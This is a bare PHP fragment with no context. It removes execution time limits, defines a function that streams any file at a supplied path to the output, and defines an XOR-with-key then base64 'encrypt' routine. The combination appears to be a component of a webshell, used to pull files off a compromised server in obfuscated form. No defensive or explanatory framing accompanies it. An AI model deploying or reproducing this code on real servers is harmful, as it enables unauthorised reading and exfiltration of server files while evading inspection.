error_reporting(1);

set_time_limit(0);
ini_set('max_execution_time', '0');

function main($path)
{
    $read_buffer = 4096;
    $handle = fopen($path,'rb');
    $sum_buffer = 0;
    while(!feof($handle)) {
        echo fread($handle,$read_buffer);
		ob_flush();
		flush();
    }
    fclose($handle);
}

function encrypt($data,$key)
{
	for($i=0;$i<strlen($data);$i++) {
    	$data[$i] = $data[$i]^$key[$i+5&15]; 
    }
	return base64_encode($data);
}